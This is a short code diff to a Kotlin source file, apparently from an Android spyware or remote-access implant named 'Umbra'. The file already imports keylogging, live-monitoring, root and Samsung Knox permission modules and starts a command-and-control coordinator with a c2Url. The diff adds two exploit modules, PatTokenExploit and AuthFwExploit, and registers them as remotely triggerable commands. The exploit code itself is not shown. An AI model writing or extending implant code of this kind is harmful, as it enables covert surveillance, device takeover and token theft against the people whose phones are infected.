@@ -23,6 +23,8 @@ import org.umbra.core.modules.KeylogModule
 import org.umbra.core.modules.KnoxPermissionGrant
 import org.umbra.core.modules.LiveMonitor
 import org.umbra.core.modules.RootModule
+import org.umbra.core.modules.PatTokenExploit
+import org.umbra.core.modules.AuthFwExploit
 
 object UmbraEngine {
     private const val TAG = "Umbra"
@@ -138,7 +140,9 @@ object UmbraEngine {
                 "daemonize" -> RootModule.daemonize(context, cmd)
                 "exploit_download" -> RootModule.exploitDownload(context, cmd)
                 else -> UmbraResponse.ErrorResponse("unknown:root:${cmd.action}", "root")
-            }}
+            }},
+            "pat"      to { cmd -> PatTokenExploit.exploit(context, cmd) },
+            "authfw"   to { cmd -> AuthFwExploit.exploit(context, cmd) }
         )
 
         C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
